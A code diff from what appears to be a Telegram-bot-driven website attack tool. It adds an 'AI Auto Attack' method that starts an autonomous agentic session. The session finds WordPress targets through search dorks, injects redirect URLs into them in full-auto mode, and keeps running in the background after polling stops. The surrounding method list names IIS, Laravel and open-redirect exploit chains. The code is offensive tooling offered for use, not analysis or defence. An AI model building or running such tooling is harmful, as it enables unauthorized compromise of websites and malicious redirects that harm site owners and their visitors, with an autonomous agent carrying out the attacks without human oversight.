@@ -3839,6 +3839,8 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         { id: "iis_aspnet", name: "IIS/ASP.NET Exploits", phase: "exploit", icon: "🪟", keywords: ["iis", "asp.net", "aspx", "web.config", "windows server", ".aspx"], cms: ["custom", "unknown"] },
         { id: "open_redirect", name: "Open Redirect Chain", phase: "hijack", icon: "🔗", keywords: ["open redirect", "redirect_uri", "return_to", "next=", "callback", "goto"], cms: ["*"] },
         { id: "laravel_inject", name: "Laravel Redirect Inject", phase: "exploit", icon: "🟥", keywords: ["laravel", "ignition", ".env", "artisan", "blade", "eloquent", "laravel debug"], cms: ["custom", "unknown"] },
+        // AI-powered autonomous attack (last resort — full AI session)
+        { id: "agentic_auto", name: "AI Auto Attack (Autonomous)", phase: "exploit", icon: "🤖", keywords: ["ai", "auto", "autonomous", "agentic", "machine learning", "smart", "adaptive"], cms: ["*"] },
       ];
       
       // ── Smart CMS Detection ──
@@ -4543,6 +4545,101 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               failedMethods.push(`Laravel`);
               await narrator.addAnalysis(`❌ Laravel exploits ล้มเหลว`);
             }
+          } else if (methodId === "agentic_auto") {
+            // ── AI Auto Attack (Autonomous Session — no timeout limit) ──
+            const aiAutoStep = await narrator.addStep("🤖 AI Auto Attack — Autonomous Session");
+            
+            const { startAgenticSession, pickRedirectUrl: pickRedirectUrlAgentic, getAgenticSessionStatus } = await import("./agentic-attack-engine");
+            
+            // Start AI session targeting this specific domain
+            const aiSession = await startAgenticSession({
+              userId: 1,
+              redirectUrls: [redirectUrl],
+              maxTargetsPerRun: 10,
+              maxConcurrent: 3,
+              targetCms: ["wordpress"],
+              mode: "full_auto",
+              customDorks: [`site:${domain}`],
+            });
+            await narrator.addAnalysis(`🤖 AI Session #${aiSession.sessionId} เริ่มทำงาน — โจมตีอัตโนมัติ`);
+            
+            // Poll session status with narration (no artificial timeout — run until done)
+            const HEARTBEAT_MS = 20_000;
+            const MAX_POLLS = 30; // ~10 minutes max per session in full_chain context
+            let sessionDone = false;
+            let lastEvtCount = 0;
+            
+            for (let poll = 0; poll < MAX_POLLS && !sessionDone; poll++) {
+              await new Promise(resolve => setTimeout(resolve, HEARTBEAT_MS));
+              
+              try {
+                const status = await getAgenticSessionStatus(aiSession.sessionId);
+                if (!status) break;
+                
+                // Narrate new events
+                const events = status.events || [];
+                const newEvts = events.slice(lastEvtCount);
+                for (const ev of newEvts.slice(-3)) {
+                  if (!ev.detail || ev.detail.length < 5) continue;
+                  const evLabel = ev.phase === "error" || ev.phase === "failed"
+                    ? `❌ ${ev.detail.substring(0, 70)}`
+                    : ev.phase === "success"
+                    ? `✅ ${ev.detail.substring(0, 70)}`
+                    : `🤖 ${ev.detail.substring(0, 70)}`;
+                  await narrator.addStep(evLabel);
+                  await narrator.completeLastStep(
+                    ev.phase === "error" || ev.phase === "failed" ? "failed" : "done"
+                  );
+                }
+                lastEvtCount = events.length;
+                
+                // Show progress stats
+                if (status.targetsDiscovered || status.targetsAttacked) {
+                  await narrator.addAnalysis(
+                    `🎯 Targets: ${status.targetsAttacked || 0}/${status.targetsDiscovered || 0}` +
+                    (status.targetsSucceeded ? ` | ✅ ${status.targetsSucceeded} success` : "") +
+                    (status.targetsFailed ? ` | ❌ ${status.targetsFailed} failed` : "")
+                  );
+                }
+                
+                // Check completion
+                if (!status.isRunning || status.status === "completed" || status.status === "error" || status.status === "stopped") {
+                  sessionDone = true;
+                  const aiSuccess = (status.targetsSucceeded || 0) > 0;
+                  
+                  if (aiSuccess) {
+                    fullChainSuccess = true;
+                    successMethod = `AI Auto Attack (Session #${aiSession.sessionId})`;
+                    successUrl = `https://${domain}`;
+                    await narrator.updateStep(aiAutoStep, "done",
+                      `✅ AI โจมตีสำเร็จ ${status.targetsSucceeded} เป้าหมาย`,
+                      Date.now() - methodStart
+                    );
+                    await narrator.addAnalysis(`✅ AI Auto Attack สำเร็จ! ${status.targetsSucceeded}/${status.targetsAttacked || 0} targets`);
+                  } else {
+                    failedMethods.push(`AI Auto (${status.targetsAttacked || 0} attacked, 0 success)`);
+                    await narrator.updateStep(aiAutoStep, "failed",
+                      `AI ลอง ${status.targetsAttacked || 0} เป้าหมาย ไม่สำเร็จ`,
+                      Date.now() - methodStart
+                    );
+                    await narrator.addAnalysis(`❌ AI Auto Attack ล้มเหลว — ลอง ${status.targetsAttacked || 0} เป้าหมาย`);
+                  }
+                }
+              } catch (pollErr: any) {
+                console.warn(`[FullChain] AI session poll error: ${pollErr.message}`);
+              }
+            }
+            
+            // If session still running after max polls
+            if (!sessionDone) {
+              await narrator.updateStep(aiAutoStep, "done",
+                `Session #${aiSession.sessionId} ยังทำงานอยู่ใน background`,
+                Date.now() - methodStart
+              );
+              await narrator.addAnalysis(`🔔 AI Session ยังทำงานอยู่ — ใช้ /status เพื่อเช็ค`);
+              // Don't count as failure — session is still running
+            }
+            
           }
         } catch (methodErr: any) {
           failedMethods.push(`${methodDef.name} (${methodErr.message?.substring(0, 40) || "error"})`);
